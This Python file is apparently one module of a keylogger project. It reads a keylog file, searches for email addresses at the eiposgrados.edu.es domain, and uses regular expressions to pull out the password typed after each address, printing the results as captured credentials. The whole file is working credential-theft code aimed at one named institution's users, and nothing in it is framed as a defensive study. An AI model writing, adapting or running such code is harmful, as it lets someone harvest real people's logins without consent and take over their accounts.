from pynput.keyboard import Key

from keyUtils import KEYLOG_FILE
import re


def detectEIPassword():
    """
    detectEIPassword
        Function to confirm the potential presence of a pair (email, password)
        \n\tIt prints a dict of found credentials.
    """
    file = open(KEYLOG_FILE, 'r')
    potentialCredentials = []
    for line in file:
        # Detect if the mail is present
        if '@eiposgrados.edu.es' in line:
            potentialCredentials.append(line)
    # If we found any, try to extract credentials
    if potentialCredentials:
        print(f'Found {len(potentialCredentials)} possible matches.')
        credentials = extractCredentials(potentialCredentials)
        print(f'''Credentials found
        {credentials}
        ''')
    else:
        print('Could not find @eiposgrados.edu.es email on the logs.')


def extractCredentials(potentialCredentials) -> dict:
    """
        extractCredentials
            Function to extract a pair of (email, password) from a line containing a potential match.
            :param potentialCredentials: str line containing a match for an @eiposgrados.edu.es email.
            :return: dict with key the matched email and value the password string
    """
    EMAIL_REGEX = r'([a-zA-Z][a-zA-Z0-9_.+-]+)@eiposgrados.edu.es'
    PASSWORD_REGEX = r'([a-zA-Z][a-zA-Z0-9_.+-]+)@eiposgrados.edu.es(\s+)([a-zA-Z][a-zA-Z0-9_.+-]+)+'
    credentials = {}
    for line in potentialCredentials:
        # We use regex( findall() ) to extract the email
        email = re.findall(EMAIL_REGEX, line)
        # Password would be at position [0][2]
        emailAndPassword = re.findall(PASSWORD_REGEX, line)
        # match = [(mail, space, password)]
        if emailAndPassword:
            credentials[f'{email[0]}@eiposgrados.edu.es'] = emailAndPassword[0][2]
        else:
            print(
                f'{email[0]}@eiposgrados.edu.es found, but no credentials identified.')

    return credentials
